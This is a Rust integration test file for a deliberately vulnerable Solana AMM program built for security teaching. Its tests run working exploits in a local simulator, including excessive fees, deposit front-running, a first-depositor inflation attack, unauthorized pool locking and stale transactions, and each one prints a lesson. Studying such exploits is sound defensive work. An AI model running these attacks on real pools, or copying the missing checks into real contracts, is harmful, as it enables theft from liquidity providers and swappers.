// Integration tests for AMM-VULNERABLE program
//
// WARNING: These tests demonstrate intentional security vulnerabilities for educational purposes.
// These exploits show what can happen when proper security checks are missing.
//
// HOW TO RUN THESE TESTS:
// From the project root directory:
//   cd programs/amm/amm-vulnerable
//   cargo test-sbf
//
// Or to run a specific test:
//   cargo test-sbf -- test_name
//
// Or with output logging:
//   cargo test-sbf -- --nocapture

mod utils;

use utils::*;
use litesvm_token::{CreateAssociatedTokenAccount, CreateMint, MintTo, get_spl_account};
use solana_sdk::{
    clock::Clock,
    instruction::Instruction,
    native_token::LAMPORTS_PER_SOL,
    signature::Signer,
    transaction::Transaction,
};

#[test]
fn test_exploit_excessive_fees() {
    // EXPLOIT: V001 - No fee validation
    // Demonstrates: Pool creator can set any fee up to u16::MAX (655.35%)
    println!("\n================================================================================");
    println!("EXPLOIT TEST: Excessive Fees (V001)");
    println!("================================================================================");
    println!("This test demonstrates how missing fee validation allows pool creators");
    println!("to set exorbitant fees that steal from swappers.");
    println!();

    let mut svm = setup_svm();
    let malicious_authority = create_funded_account(&mut svm, 10 * LAMPORTS_PER_SOL);
    println!("[Setup] Malicious pool creator funded");

    // Create token mints
    let mint_a = CreateMint::new(&mut svm, &malicious_authority)
        .authority(&malicious_authority.pubkey())
        .decimals(DECIMALS)
        .send()
        .expect("Failed to create mint A");
    let mint_b = CreateMint::new(&mut svm, &malicious_authority)
        .authority(&malicious_authority.pubkey())
        .decimals(DECIMALS)
        .send()
        .expect("Failed to create mint B");
    println!("[Setup] Token mints created");

    // EXPLOIT: Set an absurdly high fee (50000 basis points = 500% fee!)
    let excessive_fee = 50000u16;
    println!();
    println!("[EXPLOIT] Initializing pool with {} basis points ({:.2}% fee)",
             excessive_fee, excessive_fee as f64 / 100.0);
    println!("[EXPLOIT] In secure version, max fee is 1000 bp (10%)");
    println!("[EXPLOIT] In vulnerable version, attacker can set up to 65535 bp (655.35%)");

    let init_ix = build_initialize_pool_ix(
        &malicious_authority.pubkey(),
        &mint_a,
        &mint_b,
        excessive_fee,
    );

    let tx = Transaction::new_signed_with_payer(
        &[init_ix],
        Some(&malicious_authority.pubkey()),
        &[&malicious_authority],
        svm.latest_blockhash(),
    );

    let result = svm.send_transaction(tx);

    println!();
    println!("[RESULT] Pool initialization: {:?}", if result.is_ok() { "SUCCESS" } else { "FAILED" });
    println!("[IMPACT] In secure version, this would FAIL with fee validation error");
    println!("[IMPACT] In vulnerable version, this SUCCEEDS, creating a predatory pool");
    println!("[IMPACT] Users who swap on this pool will lose massive amounts to fees");

    assert!(result.is_ok(), "Vulnerable version should allow excessive fees");

    println!();
    println!("[LESSON] Always validate fee parameters against reasonable maximums");
    println!("================================================================================\n");
}

#[test]
fn test_exploit_identical_mints() {
    // EXPLOIT: V014 - No identical mint check
    // Demonstrates: Pool can be created with same token twice (SOL/SOL)
    println!("\n================================================================================");
    println!("EXPLOIT TEST: Identical Token Mints (V014)");
    println!("================================================================================");
    println!("This test demonstrates creating a nonsense pool with the same token twice.");
    println!();

    let mut svm = setup_svm();
    let authority = create_funded_account(&mut svm, 10 * LAMPORTS_PER_SOL);

    // Create single mint
    let mint = CreateMint::new(&mut svm, &authority)
        .authority(&authority.pubkey())
        .decimals(DECIMALS)
        .send()
        .expect("Failed to create mint");
    println!("[Setup] Created single token mint: {}", mint);

    // EXPLOIT: Use same mint for both tokens in pool
    println!();
    println!("[EXPLOIT] Creating pool with SAME token for both sides");
    println!("[EXPLOIT] This creates a nonsense SOL/SOL or USDC/USDC pool");

    let init_ix = build_initialize_pool_ix(
        &authority.pubkey(),
        &mint,  // Same mint
        &mint,  // Same mint again
        30,
    );

    let tx = Transaction::new_signed_with_payer(
        &[init_ix],
        Some(&authority.pubkey()),
        &[&authority],
        svm.latest_blockhash(),
    );

    let result = svm.send_transaction(tx);

    println!();
    println!("[RESULT] Identical mint pool creation: {:?}", if result.is_ok() { "SUCCESS" } else { "FAILED" });
    println!("[IMPACT] This exploit is prevented by Solana/SPL token constraints");
    println!("[IMPACT] Cannot create two ATAs with same mint and authority");
    println!("[IMPACT] While program code doesn't check, SPL enforces uniqueness");
    println!("[NOTE] In secure version, we add explicit check for clarity and early failure");
    println!("[NOTE] Vulnerable version relies on SPL constraints (implicit protection)");

    // This test demonstrates that some vulnerabilities are prevented by lower-level constraints
    // The secure version should still have explicit checks for:
    // 1. Better error messages
    // 2. Earlier failure (before attempting ATA creation)
    // 3. Documentation of intent
    // 4. Defense in depth
    assert!(result.is_err(), "SPL token constraints prevent identical mint pools");

    println!();
    println!("[LESSON] Always validate token pairs explicitly, even if lower layers enforce it");
    println!("[LESSON] Explicit checks provide better errors and document intent");
    println!("================================================================================\n");
}

#[test]
fn test_exploit_deposit_front_running() {
    // EXPLOIT: V002 - No slippage protection on deposits
    // Demonstrates: Front-runner manipulates pool ratio before victim's deposit
    println!("\n================================================================================");
    println!("EXPLOIT TEST: Deposit Front-Running (V002 - No Slippage Protection)");
    println!("================================================================================");
    println!("This test demonstrates how missing slippage protection allows front-running.");
    println!("Attacker manipulates pool ratio, victim deposits at terrible ratio.");
    println!();

    let mut svm = setup_svm();
    let authority = create_funded_account(&mut svm, 10 * LAMPORTS_PER_SOL);
    let victim = create_funded_account(&mut svm, 10 * LAMPORTS_PER_SOL);
    let attacker = create_funded_account(&mut svm, 100 * LAMPORTS_PER_SOL);
    println!("[Setup] Authority, victim, and attacker funded");

    // Create mints and initialize pool
    let mint_a = CreateMint::new(&mut svm, &authority)
        .authority(&authority.pubkey())
        .decimals(DECIMALS)
        .send()
        .unwrap();
    let mint_b = CreateMint::new(&mut svm, &authority)
        .authority(&authority.pubkey())
        .decimals(DECIMALS)
        .send()
        .unwrap();

    let init_ix = build_initialize_pool_ix(&authority.pubkey(), &mint_a, &mint_b, 30);
    let tx = Transaction::new_signed_with_payer(
        &[init_ix],
        Some(&authority.pubkey()),
        &[&authority],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();
    println!("[Setup] Pool initialized with 1:1 ratio");

    // Add initial liquidity (authority)
    let auth_ata_a = CreateAssociatedTokenAccount::new(&mut svm, &authority, &mint_a)
        .owner(&authority.pubkey())
        .send()
        .unwrap();
    let auth_ata_b = CreateAssociatedTokenAccount::new(&mut svm, &authority, &mint_b)
        .owner(&authority.pubkey())
        .send()
        .unwrap();

    let initial_liquidity = 100_000_000_000; // 100 tokens each
    MintTo::new(&mut svm, &authority, &mint_a, &auth_ata_a, initial_liquidity)
        .owner(&authority)
        .send()
        .unwrap();
    MintTo::new(&mut svm, &authority, &mint_b, &auth_ata_b, initial_liquidity)
        .owner(&authority)
        .send()
        .unwrap();

    let clock = svm.get_sysvar::<Clock>();
    let expiration = clock.unix_timestamp + 60;

    let deposit_ix = build_deposit_liquidity_ix(
        &authority.pubkey(),
        &mint_a,
        &mint_b,
        initial_liquidity,
        initial_liquidity,
        initial_liquidity,
        initial_liquidity,
        expiration,
    );
    let tx = Transaction::new_signed_with_payer(
        &[deposit_ix],
        Some(&authority.pubkey()),
        &[&authority],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();
    println!("[Setup] Initial liquidity added: 100 A + 100 B");

    // Setup victim with tokens
    let victim_ata_a = CreateAssociatedTokenAccount::new(&mut svm, &victim, &mint_a)
        .owner(&victim.pubkey())
        .send()
        .unwrap();
    let victim_ata_b = CreateAssociatedTokenAccount::new(&mut svm, &victim, &mint_b)
        .owner(&victim.pubkey())
        .send()
        .unwrap();

    let victim_amount = 10_000_000_000; // 10 tokens
    MintTo::new(&mut svm, &authority, &mint_a, &victim_ata_a, victim_amount)
        .owner(&authority)
        .send()
        .unwrap();
    MintTo::new(&mut svm, &authority, &mint_b, &victim_ata_b, victim_amount)
        .owner(&authority)
        .send()
        .unwrap();
    println!("[Setup] Victim has 10 A + 10 B tokens");

    // Setup attacker with massive funds for swap
    let attacker_ata_a = CreateAssociatedTokenAccount::new(&mut svm, &attacker, &mint_a)
        .owner(&attacker.pubkey())
        .send()
        .unwrap();
    let attacker_amount = 50_000_000_000; // 50 tokens
    MintTo::new(&mut svm, &authority, &mint_a, &attacker_ata_a, attacker_amount)
        .owner(&authority)
        .send()
        .unwrap();
    println!("[Setup] Attacker has 50 A tokens for manipulation");

    println!();
    println!("[SCENARIO] Victim wants to deposit 10 A + 10 B");
    println!("[SCENARIO] Victim sets max_amount_a=10, max_amount_b=10 (expects 1:1 ratio)");
    println!();

    // EXPLOIT STEP 1: Attacker front-runs by swapping massive amount
    println!("[EXPLOIT STEP 1] Attacker sees victim's pending transaction in mempool");
    println!("[EXPLOIT STEP 1] Attacker front-runs with massive 50 A → B swap");
    println!("[EXPLOIT STEP 1] This manipulates pool ratio from 1:1 to heavily skewed");

    let swap_ix = build_swap_tokens_ix(
        &attacker.pubkey(),
        &mint_a,
        &mint_b,
        true, // A for B
        attacker_amount,
        1,
        expiration,
    );
    let tx = Transaction::new_signed_with_payer(
        &[swap_ix],
        Some(&attacker.pubkey()),
        &[&attacker],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();
    println!("[EXPLOIT STEP 1] Front-run swap executed - pool ratio now heavily manipulated");

    // EXPLOIT STEP 2: Victim's deposit executes at terrible ratio
    println!();
    println!("[EXPLOIT STEP 2] Victim's deposit transaction executes");
    println!("[EXPLOIT STEP 2] NO SLIPPAGE CHECK in vulnerable version");
    println!("[EXPLOIT STEP 2] Deposit proceeds at manipulated ratio");

    let deposit_ix = build_deposit_liquidity_ix(
        &victim.pubkey(),
        &mint_a,
        &mint_b,
        victim_amount,
        victim_amount,
        victim_amount, // max_amount_a - should fail if checked
        victim_amount, // max_amount_b - should fail if checked
        expiration,
    );
    let tx = Transaction::new_signed_with_payer(
        &[deposit_ix],
        Some(&victim.pubkey()),
        &[&victim],
        svm.latest_blockhash(),
    );

    let result = svm.send_transaction(tx);

    println!();
    println!("[RESULT] Victim deposit: {:?}", if result.is_ok() { "SUCCESS" } else { "FAILED" });
    println!("[IMPACT] In secure version, this would FAIL due to slippage protection");
    println!("[IMPACT] In vulnerable version, this SUCCEEDS at terrible ratio");
    println!("[IMPACT] Victim deposits tokens but receives far fewer LP tokens than expected");

    assert!(result.is_ok(), "Vulnerable version allows deposit despite manipulation");

    println!();
    println!("[LESSON] Always enforce slippage protection on deposits");
    println!("[LESSON] max_amount_a and max_amount_b must be validated");
    println!("================================================================================\n");
}

#[test]
fn test_exploit_inflation_attack() {
    // EXPLOIT: V005 - MINIMUM_LIQUIDITY = 1 (enables inflation attacks)
    // Demonstrates: First depositor can inflate LP token value to steal from later depositors
    println!("\n================================================================================");
    println!("EXPLOIT TEST: Inflation Attack (V005 - MINIMUM_LIQUIDITY too low)");
    println!("================================================================================");
    println!("This test demonstrates classic DeFi inflation attack on first deposit.");
    println!("Attacker creates pool, donates tokens to inflate LP value, victim gets 0 LP.");
    println!();

    let mut svm = setup_svm();
    let authority = create_funded_account(&mut svm, 10 * LAMPORTS_PER_SOL);
    let attacker = create_funded_account(&mut svm, 100 * LAMPORTS_PER_SOL);
    let victim = create_funded_account(&mut svm, 10 * LAMPORTS_PER_SOL);
    println!("[Setup] Authority, attacker, and victim funded");

    // Create mints
    let mint_a = CreateMint::new(&mut svm, &authority)
        .authority(&authority.pubkey())
        .decimals(DECIMALS)
        .send()
        .unwrap();
    let mint_b = CreateMint::new(&mut svm, &authority)
        .authority(&authority.pubkey())
        .decimals(DECIMALS)
        .send()
        .unwrap();
    println!("[Setup] Token mints created");

    // Initialize pool
    let init_ix = build_initialize_pool_ix(&attacker.pubkey(), &mint_a, &mint_b, 30);
    let tx = Transaction::new_signed_with_payer(
        &[init_ix],
        Some(&attacker.pubkey()),
        &[&attacker],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();
    println!("[Setup] Pool initialized by attacker");

    // EXPLOIT STEP 1: Attacker deposits minimal amounts
    println!();
    println!("[EXPLOIT STEP 1] Attacker performs first deposit with tiny amounts");
    let attacker_ata_a = CreateAssociatedTokenAccount::new(&mut svm, &attacker, &mint_a)
        .owner(&attacker.pubkey())
        .send()
        .unwrap();
    let attacker_ata_b = CreateAssociatedTokenAccount::new(&mut svm, &attacker, &mint_b)
        .owner(&attacker.pubkey())
        .send()
        .unwrap();

    let tiny_amount = 1000; // Minimal amount
    MintTo::new(&mut svm, &authority, &mint_a, &attacker_ata_a, tiny_amount * 2)
        .owner(&authority)
        .send()
        .unwrap();
    MintTo::new(&mut svm, &authority, &mint_b, &attacker_ata_b, tiny_amount * 2)
        .owner(&authority)
        .send()
        .unwrap();

    let clock = svm.get_sysvar::<Clock>();
    let expiration = clock.unix_timestamp + 60;

    let deposit_ix = build_deposit_liquidity_ix(
        &attacker.pubkey(),
        &mint_a,
        &mint_b,
        tiny_amount,
        tiny_amount,
        tiny_amount,
        tiny_amount,
        expiration,
    );
    let tx = Transaction::new_signed_with_payer(
        &[deposit_ix],
        Some(&attacker.pubkey()),
        &[&attacker],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();
    println!("[EXPLOIT STEP 1] First deposit complete: {} A + {} B", tiny_amount, tiny_amount);
    println!("[EXPLOIT STEP 1] With MINIMUM_LIQUIDITY=1, attacker gets sqrt(1000*1000)-1 LP tokens");

    // EXPLOIT STEP 2: Attacker donates massive amounts directly to vaults
    println!();
    println!("[EXPLOIT STEP 2] Attacker donates MASSIVE amounts directly to vaults");
    println!("[EXPLOIT STEP 2] This inflates the LP token value without minting new LP");

    let (pool_config, _) = derive_pool_config_pda(&mint_a, &mint_b);
    let (pool_authority, _) = derive_pool_authority_pda(&pool_config);
    let vault_a = spl_associated_token_account::get_associated_token_address(&pool_authority, &mint_a);
    let vault_b = spl_associated_token_account::get_associated_token_address(&pool_authority, &mint_b);

    let donation_amount = 1_000_000_000; // Donate 1 billion units
    MintTo::new(&mut svm, &authority, &mint_a, &attacker_ata_a, donation_amount)
        .owner(&authority)
        .send()
        .unwrap();
    MintTo::new(&mut svm, &authority, &mint_b, &attacker_ata_b, donation_amount)
        .owner(&authority)
        .send()
        .unwrap();

    // Transfer donation to vault A
    let transfer_a_ix = spl_token::instruction::transfer(
        &spl_token::ID,
        &attacker_ata_a,
        &vault_a,
        &attacker.pubkey(),
        &[],
        donation_amount,
    ).unwrap();

    let tx = Transaction::new_signed_with_payer(
        &[transfer_a_ix],
        Some(&attacker.pubkey()),
        &[&attacker],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();

    // Transfer donation to vault B
    let transfer_b_ix = spl_token::instruction::transfer(
        &spl_token::ID,
        &attacker_ata_b,
        &vault_b,
        &attacker.pubkey(),
        &[],
        donation_amount,
    ).unwrap();

    let tx = Transaction::new_signed_with_payer(
        &[transfer_b_ix],
        Some(&attacker.pubkey()),
        &[&attacker],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();

    println!("[EXPLOIT STEP 2] Donated {} tokens to each vault", donation_amount);
    println!("[EXPLOIT STEP 2] Pool now has ~1B A + ~1B B, but LP supply is still tiny");
    println!("[EXPLOIT STEP 2] Each LP token now represents huge amount of underlying");

    // EXPLOIT STEP 3: Victim tries to deposit reasonable amount
    println!();
    println!("[EXPLOIT STEP 3] Victim deposits reasonable amount");

    let victim_ata_a = CreateAssociatedTokenAccount::new(&mut svm, &victim, &mint_a)
        .owner(&victim.pubkey())
        .send()
        .unwrap();
    let victim_ata_b = CreateAssociatedTokenAccount::new(&mut svm, &victim, &mint_b)
        .owner(&victim.pubkey())
        .send()
        .unwrap();

    let victim_amount = 100_000_000; // 100M units
    MintTo::new(&mut svm, &authority, &mint_a, &victim_ata_a, victim_amount)
        .owner(&authority)
        .send()
        .unwrap();
    MintTo::new(&mut svm, &authority, &mint_b, &victim_ata_b, victim_amount)
        .owner(&authority)
        .send()
        .unwrap();

    let deposit_ix = build_deposit_liquidity_ix(
        &victim.pubkey(),
        &mint_a,
        &mint_b,
        victim_amount,
        victim_amount,
        victim_amount,
        victim_amount,
        expiration,
    );
    let tx = Transaction::new_signed_with_payer(
        &[deposit_ix],
        Some(&victim.pubkey()),
        &[&victim],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();

    println!("[EXPLOIT STEP 3] Victim deposited {} A + {} B", victim_amount, victim_amount);

    // Check victim's LP tokens
    let (lp_mint, _) = derive_lp_mint_pda(&pool_config);
    let victim_lp_ata = spl_associated_token_account::get_associated_token_address(&victim.pubkey(), &lp_mint);
    let victim_lp_account: spl_token::state::Account = get_spl_account(&svm, &victim_lp_ata)
        .expect("LP account should exist");

    println!();
    println!("[RESULT] Victim's LP token balance: {}", victim_lp_account.amount);
    println!("[IMPACT] Due to rounding in proportional calculation, victim may receive 0 or very few LP tokens");
    println!("[IMPACT] Victim deposited {} tokens but LP value is so inflated they get almost nothing", victim_amount);
    println!("[IMPACT] Attacker can now withdraw all liquidity, stealing victim's deposit");

    println!();
    println!("[LESSON] MINIMUM_LIQUIDITY must be high enough (e.g., 1000) to prevent inflation attacks");
    println!("[LESSON] Secure version locks 1000 LP tokens to make this attack economically infeasible");
    println!("================================================================================\n");
}

#[test]
fn test_exploit_unauthorized_lock() {
    // EXPLOIT: V006 - No authorization check on lock_pool
    // Demonstrates: Anyone can lock any pool (DoS attack)
    println!("\n================================================================================");
    println!("EXPLOIT TEST: Unauthorized Pool Lock (V006 - No Authorization Check)");
    println!("================================================================================");
    println!("This test demonstrates DoS attack via unauthorized pool locking.");
    println!();

    let mut svm = setup_svm();
    let legitimate_authority = create_funded_account(&mut svm, 10 * LAMPORTS_PER_SOL);
    let attacker = create_funded_account(&mut svm, 10 * LAMPORTS_PER_SOL);
    println!("[Setup] Legitimate authority and attacker funded");

    // Create pool by legitimate authority
    let mint_a = CreateMint::new(&mut svm, &legitimate_authority)
        .authority(&legitimate_authority.pubkey())
        .decimals(DECIMALS)
        .send()
        .unwrap();
    let mint_b = CreateMint::new(&mut svm, &legitimate_authority)
        .authority(&legitimate_authority.pubkey())
        .decimals(DECIMALS)
        .send()
        .unwrap();

    let init_ix = build_initialize_pool_ix(&legitimate_authority.pubkey(), &mint_a, &mint_b, 30);
    let tx = Transaction::new_signed_with_payer(
        &[init_ix],
        Some(&legitimate_authority.pubkey()),
        &[&legitimate_authority],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();
    println!("[Setup] Pool created by legitimate authority");

    println!();
    println!("[EXPLOIT] Attacker (NOT the pool authority) attempts to lock pool");
    println!("[EXPLOIT] In secure version, this should FAIL with authorization error");
    println!("[EXPLOIT] In vulnerable version, ANYONE can lock ANY pool");

    // EXPLOIT: Attacker locks the pool
    let lock_ix = build_lock_pool_ix(&attacker.pubkey(), &mint_a, &mint_b);
    let tx = Transaction::new_signed_with_payer(
        &[lock_ix],
        Some(&attacker.pubkey()),
        &[&attacker],
        svm.latest_blockhash(),
    );

    let result = svm.send_transaction(tx);

    println!();
    println!("[RESULT] Attacker's lock attempt: {:?}", if result.is_ok() { "SUCCESS" } else { "FAILED" });
    println!("[IMPACT] In secure version, this would FAIL");
    println!("[IMPACT] In vulnerable version, this SUCCEEDS - attacker locked someone else's pool!");
    println!("[IMPACT] DoS Attack: Pool is now locked, all operations disabled");
    println!("[IMPACT] Legitimate users cannot deposit, withdraw, or swap");
    println!("[IMPACT] Attacker can do this to ALL pools on the protocol");

    assert!(result.is_ok(), "Vulnerable version allows unauthorized lock");

    println!();
    println!("[LESSON] Always check that signer is the pool authority before admin operations");
    println!("================================================================================\n");
}

#[test]
fn test_exploit_stale_transaction() {
    // EXPLOIT: V003 - No expiration validation
    // Demonstrates: Transaction can execute hours/days after submission at terrible price
    println!("\n================================================================================");
    println!("EXPLOIT TEST: Stale Transaction Execution (V003 - No Expiration Validation)");
    println!("================================================================================");
    println!("This test demonstrates executing a stale transaction after market conditions changed.");
    println!();

    let mut svm = setup_svm();
    let authority = create_funded_account(&mut svm, 10 * LAMPORTS_PER_SOL);
    let victim = create_funded_account(&mut svm, 10 * LAMPORTS_PER_SOL);
    println!("[Setup] Authority and victim funded");

    // Setup pool with liquidity
    let mint_a = CreateMint::new(&mut svm, &authority)
        .authority(&authority.pubkey())
        .decimals(DECIMALS)
        .send()
        .unwrap();
    let mint_b = CreateMint::new(&mut svm, &authority)
        .authority(&authority.pubkey())
        .decimals(DECIMALS)
        .send()
        .unwrap();

    let init_ix = build_initialize_pool_ix(&authority.pubkey(), &mint_a, &mint_b, 30);
    let tx = Transaction::new_signed_with_payer(
        &[init_ix],
        Some(&authority.pubkey()),
        &[&authority],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();

    // Add initial liquidity
    let auth_ata_a = CreateAssociatedTokenAccount::new(&mut svm, &authority, &mint_a)
        .owner(&authority.pubkey())
        .send()
        .unwrap();
    let auth_ata_b = CreateAssociatedTokenAccount::new(&mut svm, &authority, &mint_b)
        .owner(&authority.pubkey())
        .send()
        .unwrap();

    let liquidity = 100_000_000_000;
    MintTo::new(&mut svm, &authority, &mint_a, &auth_ata_a, liquidity)
        .owner(&authority)
        .send()
        .unwrap();
    MintTo::new(&mut svm, &authority, &mint_b, &auth_ata_b, liquidity)
        .owner(&authority)
        .send()
        .unwrap();

    let clock = svm.get_sysvar::<Clock>();
    let expiration = clock.unix_timestamp + 60;

    let deposit_ix = build_deposit_liquidity_ix(
        &authority.pubkey(),
        &mint_a,
        &mint_b,
        liquidity,
        liquidity,
        liquidity,
        liquidity,
        expiration,
    );
    let tx = Transaction::new_signed_with_payer(
        &[deposit_ix],
        Some(&authority.pubkey()),
        &[&authority],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();
    println!("[Setup] Pool has liquidity: 100 A + 100 B");

    // Victim prepares swap with OLD expiration (simulating hours-old transaction)
    let victim_ata_a = CreateAssociatedTokenAccount::new(&mut svm, &victim, &mint_a)
        .owner(&victim.pubkey())
        .send()
        .unwrap();

    let swap_amount = 1_000_000_000;
    MintTo::new(&mut svm, &authority, &mint_a, &victim_ata_a, swap_amount)
        .owner(&authority)
        .send()
        .unwrap();

    println!();
    println!("[SCENARIO] Victim created swap transaction hours ago when price was good");
    println!("[SCENARIO] Using expiration timestamp from THE PAST: {}", clock.unix_timestamp - 3600);
    println!("[SCENARIO] Market has moved significantly since then");
    println!("[SCENARIO] In secure version, expired transaction should FAIL");
    println!();

    let stale_expiration = clock.unix_timestamp - 3600; // 1 hour in the past

    let swap_ix = build_swap_tokens_ix(
        &victim.pubkey(),
        &mint_a,
        &mint_b,
        true,
        swap_amount,
        1,
        stale_expiration, // STALE EXPIRATION
    );

    let tx = Transaction::new_signed_with_payer(
        &[swap_ix],
        Some(&victim.pubkey()),
        &[&victim],
        svm.latest_blockhash(),
    );

    println!("[EXPLOIT] Executing swap with stale expiration timestamp");
    let result = svm.send_transaction(tx);

    println!();
    println!("[RESULT] Stale transaction execution: {:?}", if result.is_ok() { "SUCCESS" } else { "FAILED" });
    println!("[IMPACT] In secure version, this would FAIL with TransactionExpired error");
    println!("[IMPACT] In vulnerable version, this SUCCEEDS despite being hours old");
    println!("[IMPACT] Victim's swap executes at current (terrible) price instead of failing");

    assert!(result.is_ok(), "Vulnerable version allows stale transactions");

    println!();
    println!("[LESSON] Always validate expiration timestamp against current clock");
    println!("================================================================================\n");
}

#[test]
fn test_all_basic_operations_work() {
    // Sanity test: Verify basic functionality still works
    println!("\n================================================================================");
    println!("SANITY TEST: Basic Operations Still Function");
    println!("================================================================================");
    println!("This test verifies that despite vulnerabilities, basic AMM operations work.");
    println!();

    let mut svm = setup_svm();
    let authority = create_funded_account(&mut svm, 10 * LAMPORTS_PER_SOL);
    let user = create_funded_account(&mut svm, 10 * LAMPORTS_PER_SOL);

    // Initialize pool
    let mint_a = CreateMint::new(&mut svm, &authority)
        .authority(&authority.pubkey())
        .decimals(DECIMALS)
        .send()
        .unwrap();
    let mint_b = CreateMint::new(&mut svm, &authority)
        .authority(&authority.pubkey())
        .decimals(DECIMALS)
        .send()
        .unwrap();

    let init_ix = build_initialize_pool_ix(&authority.pubkey(), &mint_a, &mint_b, 30);
    let tx = Transaction::new_signed_with_payer(
        &[init_ix],
        Some(&authority.pubkey()),
        &[&authority],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();
    println!("[OK] Pool initialization");

    // Deposit liquidity
    let user_ata_a = CreateAssociatedTokenAccount::new(&mut svm, &user, &mint_a)
        .owner(&user.pubkey())
        .send()
        .unwrap();
    let user_ata_b = CreateAssociatedTokenAccount::new(&mut svm, &user, &mint_b)
        .owner(&user.pubkey())
        .send()
        .unwrap();

    let amount = 10_000_000_000;
    MintTo::new(&mut svm, &authority, &mint_a, &user_ata_a, amount)
        .owner(&authority)
        .send()
        .unwrap();
    MintTo::new(&mut svm, &authority, &mint_b, &user_ata_b, amount)
        .owner(&authority)
        .send()
        .unwrap();

    let clock = svm.get_sysvar::<Clock>();
    let expiration = clock.unix_timestamp + 60;

    let deposit_ix = build_deposit_liquidity_ix(
        &user.pubkey(),
        &mint_a,
        &mint_b,
        amount,
        amount,
        amount,
        amount,
        expiration,
    );
    let tx = Transaction::new_signed_with_payer(
        &[deposit_ix],
        Some(&user.pubkey()),
        &[&user],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();
    println!("[OK] Deposit liquidity");

    // Swap tokens
    MintTo::new(&mut svm, &authority, &mint_a, &user_ata_a, 1_000_000_000)
        .owner(&authority)
        .send()
        .unwrap();

    let swap_ix = build_swap_tokens_ix(
        &user.pubkey(),
        &mint_a,
        &mint_b,
        true,
        1_000_000_000,
        1,
        expiration,
    );
    let tx = Transaction::new_signed_with_payer(
        &[swap_ix],
        Some(&user.pubkey()),
        &[&user],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();
    println!("[OK] Token swap");

    // Withdraw liquidity
    let (pool_config, _) = derive_pool_config_pda(&mint_a, &mint_b);
    let (lp_mint, _) = derive_lp_mint_pda(&pool_config);
    let user_lp_ata = spl_associated_token_account::get_associated_token_address(&user.pubkey(), &lp_mint);
    let lp_account: spl_token::state::Account = get_spl_account(&svm, &user_lp_ata).unwrap();

    let withdraw_ix = build_withdraw_liquidity_ix(
        &user.pubkey(),
        &mint_a,
        &mint_b,
        lp_account.amount / 2,
        1,
        1,
        expiration,
    );
    let tx = Transaction::new_signed_with_payer(
        &[withdraw_ix],
        Some(&user.pubkey()),
        &[&user],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();
    println!("[OK] Withdraw liquidity");

    // Lock and unlock pool
    let lock_ix = build_lock_pool_ix(&authority.pubkey(), &mint_a, &mint_b);
    let tx = Transaction::new_signed_with_payer(
        &[lock_ix],
        Some(&authority.pubkey()),
        &[&authority],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();
    println!("[OK] Lock pool");

    let unlock_ix = build_unlock_pool_ix(&authority.pubkey(), &mint_a, &mint_b);
    let tx = Transaction::new_signed_with_payer(
        &[unlock_ix],
        Some(&authority.pubkey()),
        &[&authority],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();
    println!("[OK] Unlock pool");

    println!();
    println!("[SUCCESS] All basic operations function correctly");
    println!("[NOTE] Vulnerabilities are in missing SECURITY CHECKS, not core functionality");
    println!("================================================================================\n");
}
